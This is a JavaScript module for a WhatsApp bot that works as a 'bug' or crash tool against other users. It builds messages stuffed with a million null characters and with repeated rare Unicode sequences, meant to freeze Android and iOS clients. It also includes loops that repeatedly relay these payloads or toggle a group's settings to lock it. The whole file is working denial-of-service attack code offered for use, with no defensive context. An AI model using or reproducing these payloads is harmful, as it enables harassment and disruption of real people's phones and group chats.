'use strict';
const settings = require('../settings');

function wa() { return require('../main'); }

const NULLS = '\u0000'.repeat(1000000);
const IOS_SEQ = '\u{111C2}\u{111B5}\u{111B4}\u{111BF}';

// ── toaa freeze (Android) ────────────────────────────────────────────────────
async function toaaFreeze(conn, jid) {
  const { generateWAMessageFromContent } = wa();

  const built = generateWAMessageFromContent(jid, {
    extendedTextMessage: {
      text: 'toaa freeze',
      contextInfo: {
        mentionedJid: [],
        isForwarded: true,
        forwardingScore: 999,
        inapp_signup: {
          title: NULLS,
          body: '7eppsynC',
          source: 'toaa',
          renderMode: 1
        }
      }
    }
  }, { userJid: conn.user.id });

  await conn.relayMessage(jid, built.message, { messageId: built.key.id });
}

// ── fiOS (iOS view-once loop) ───────────────────────────────────────────────
async function fiOS(conn, jid, rounds = settings.FREEZE_ROUNDS) {
  const { generateWAMessageFromContent } = wa();

  for (let i = 0; i < rounds; i++) {
    const built = generateWAMessageFromContent(jid, {
      viewOnceMessage: {
        message: {
          buttonsMessage: {
            contentText: 'toaa freeze',
            footerText: '℘',
            headerType: 1,
            contextInfo: { mentionedJid: [], isSecret: true },
            buttons: [{
              buttonId: '1',
              type: 1,
              buttonText: { displayText: IOS_SEQ.repeat(1000) }
            }]
          }
        }
      }
    }, { userJid: conn.user.id });

    await conn.relayMessage(jid, built.message, { messageId: built.key.id });
    await new Promise(r => setTimeout(r, 1000));
  }
}

// ── lock_group 75x ─────────────────────────────────────────────────────────
async function lockGroup(conn, jid, rounds = 75) {
  for (let i = 0; i < rounds; i++) {
    try { await conn.groupSettingUpdate(jid, 'announcement'); } catch {}
    await new Promise(r => setTimeout(r, 500));
  }
}

// ── groupBan ───────────────────────────────────────────────────────────────
async function groupBan(conn, jid) {
  const { generateWAMessageFromContent } = wa();
  const built = generateWAMessageFromContent(jid, {
    extendedTextMessage: {
      text: 'toaa freeze',
      contextInfo: { mentionedJid: [], isForwarded: true, forwardingScore: 999, inapp_signup: { title: NULLS, body: '7eppsynC' } }
    }
  }, { userJid: conn.user.id });
  await conn.relayMessage(jid, built.message, { messageId: built.key.id });
  await lockGroup(conn, jid);
}

async function sendBugImage(conn, jid) {
  try {
    await conn.sendMessage(jid, { image: { url: settings.BUG_IMAGE }, caption: '℘ 𝙩𝙤𝙖𝙖 𝙛𝙧𝙚𝙚𝙯𝙚 ℘' });
  } catch {}
}

module.exports = { toaaFreeze, fiOS, lockGroup, groupBan, sendBugImage };